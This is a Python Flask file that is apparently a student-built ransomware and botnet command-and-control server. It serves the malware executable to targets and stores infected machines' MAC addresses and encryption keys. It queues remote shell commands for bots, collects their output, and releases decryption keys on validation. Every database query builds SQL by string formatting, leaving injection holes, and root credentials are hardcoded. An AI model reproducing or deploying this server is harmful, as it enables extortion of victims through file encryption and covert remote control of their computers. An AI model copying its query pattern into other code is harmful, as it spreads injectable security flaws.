from flask import Flask, send_file, request
import os
import csv
import base64
import datetime
from flask_mysqldb import MySQL
from Crypto.PublicKey import RSA

#sudo apt-get install libmysqlclient-dev
#pip3 install flask_mysqldb --user daniel

app = Flask(__name__)
 
#uncomment for docker
app.config['MYSQL_HOST'] = 'db'

#app.config['MYSQL_HOST'] = '127.0.0.1'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'toor'
app.config['MYSQL_DB'] = 'InfectedInfo'

mysql = MySQL(app)


def FindMac(MacAddy):
    cur = mysql.connection.cursor()
    found = cur.execute( "(SELECT MacAddress from Bots WHERE MacAddress = '%s' )" % (MacAddy) )
    cur.close()
    return (found)

def AddToTable(MacAddy, EncKey,time,Shell,Encrypt):
    cur = mysql.connection.cursor()
    val = cur.execute( "INSERT INTO Bots(MacAddress, AESkey,LastAccess,Shell,Encrypted) VALUES ('%s', '%s', '%s', '%d', '%d')" % (MacAddy, EncKey,time,Shell,Encrypt) ) 
    mysql.connection.commit()
    cur.close()
    return (val)

def UpdateTime(MacAddy, time):
    cur = mysql.connection.cursor()
    val = cur.execute( "UPDATE Bots SET LastAccess = '%s' WHERE MacAddress = '%s' " % (time, MacAddy) )
    mysql.connection.commit()
    cur.close()
    return (val)

def LookUpshell(MacAddy):
    cur = mysql.connection.cursor()
    sql = ( "SELECT Shell from Bots WHERE MacAddress = '%s' " % (MacAddy) )
    cur.execute( sql)
    shell = cur.fetchone()
    cur.close()
    return str(shell[0])

def GetCommand(MacAddy):
    cur = mysql.connection.cursor()
    cur.execute( " SELECT Cmd from Bots WHERE MacAddress = '%s' " % (MacAddy) )
    cmd = cur.fetchone()
    val = cur.execute( "UPDATE Bots SET Cmd = NULL WHERE MacAddress = '%s' " % ( MacAddy ) )
    mysql.connection.commit()
    cur.close()
    return str(cmd[0])

def StoreCommand(MacAddy, Data):
    # Data = Data.decode("utf-8").encode('ascii', 'ignore').decode('ascii')
    print(Data)
    cur = mysql.connection.cursor()
    val = cur.execute( "UPDATE Bots SET Rsp ='%s' WHERE MacAddress = '%s' " %  (Data, MacAddy ) )
    mysql.connection.commit()
    cur.close()
    return str(val)

def KeyGen(MacAddy):
    #TODO
    #Do keygen shit insert it into database
    Key = "TEMPSHIT"

    cur = mysql.connection.cursor()
    val = cur.execute( "UPDATE Bots SET Keygen = '%s' WHERE MacAddress = '%s' " %  (Key, MacAddy ) )
    mysql.connection.commit()
    cur.close()
    return str(val)

def Validate(Key):
    cur = mysql.connection.cursor()
    found = cur.execute( "(SELECT AESkey from Bots WHERE Keygen = '%s' )" % (Key) )
    AESKey = cur.fetchone()
    cur.close()
    return str(AESKey[0])


"""
Route: N/a
Request: GET
Args: N/A
"""
@app.route("/")
def home():
    return "Hello, World!"


"""
Route: robots.txt
Request: GET
Args: N/A
Action: reply bad words
"""
@app.route("/robots.txt", methods=['GET'])
def test():
    return "FUCK YOU H$CK3R I am just making a skool Project!"



"""
Route: Download
Request: GET
Args: N/A
Action: Downlaods the executable file of the malware to the target
"""
@app.route("/Download",  methods=['GET'])
def downloadFile ():
    #For windows you need to use drive name [ex: F:/Example.pdf]
    path = "a.out"
    return send_file(path, as_attachment=True)



"""
Route: SendMacEncKey
Request: POST
Args: 
    Mac: Mac address of the computer 
    Enc: AES encrypted priv key with the public key and base64.
Action: target sends the Mac addy and the encrypted key 
"""
@app.route("/SendMacEncKey",  methods=['POST'])
def StoreEncKey ():
    try:
        MacAddy = request.form['Mac']
        EncKey  = request.form['EncKey']
        time    = datetime.datetime.now()
        Shell   = 0
        Encrypt = 1
    except RuntimeError as err:
        print("Error")
    if not FindMac(MacAddy):
        print ("INSERTED")
        val = AddToTable (MacAddy, EncKey,time,Shell,Encrypt)
        KeyGen(MacAddy)
        return "1"
    return "0"
    


"""
Route: GetKey
Request: GET
Args: N/A
Action: target receives a public key
"""
@app.route("/GetKey",  methods=['GET'])
def getKey():
    if os.path.isfile('RSAMalwareKey.pem'):
        print ("Using known private key file")
        f = open('RSAMalwareKey.pem','r')
        key = RSA.importKey(f.read())
        f.close()
    else:
        print("Generating new private key")
        key = RSA.generate(2048)
        print (key.exportKey('PEM'))
        f = open('RSAMalwareKey.pem','wb')
        f.write(key.exportKey('PEM'))
        f.close()
    return key.publickey().exportKey('PEM')
    


"""
Route: Status
Request: GET
Args: 
    Mac: Mac address
Action: Lets the C2 server know every minute that we are online, Returns Shell info, if data returned = 0 do shell other wise 1
and the second zero is if you should encrypt or not. 0 for no and 1 for yes
"""
@app.route("/Status",  methods=['GET'])
def status():
    MacAddy = request.args["Mac"]
    if FindMac(MacAddy):
        UpdateTime( MacAddy, datetime.datetime.now() )
        shell = LookUpshell(MacAddy)
        return shell
    return "Mac not found"
    

"""
Route: GetCommand
Request: GET
Args: 
    Mac: Mac address
Action: 
"""
@app.route("/GetCommand",  methods=['GET'])
def Bash():
    MacAddy = request.args["Mac"]
    time = datetime.datetime.now()
    if FindMac(MacAddy):
        UpdateTime(MacAddy, time)
        cmd = GetCommand(MacAddy)
        print()
        print(cmd)
        print()
        return cmd
    return "No Mac Found"

"""
Route: 
Request: GET
Args: 
    Mac: Mac address
    Data: Command Reply
Action: 
"""
@app.route("/CommandReply",  methods=['POST'])
def CmdRep():
    MacAddy = request.form['Mac']
    Data    = request.form['Data']
    # Data = base64.b64decode(Data)
    print(Data)
    if FindMac(MacAddy):
        time = datetime.datetime.now()
        UpdateTime(MacAddy, time)
        val =  StoreCommand(MacAddy, Data)
        return val
    return "Mac not found"

"""
Route: 
Request: GET
Args: 
    Mac: Mac address
    ValidNum: 
    CredPros
Action: 
"""
@app.route("/Decrypt",  methods=['POST'])
def SendAES():
    Key = request.form['Key']
    Data = request.form['ValidNum']
    Process = request.form['CredProc']
    AES = Validate(Key)
    if AES and Data == "True" and Process == "True":
        return AES
    return "Invalid"



if __name__ == "__main__":
    app.run(host='0.0.0.0',debug=True, port=5000)
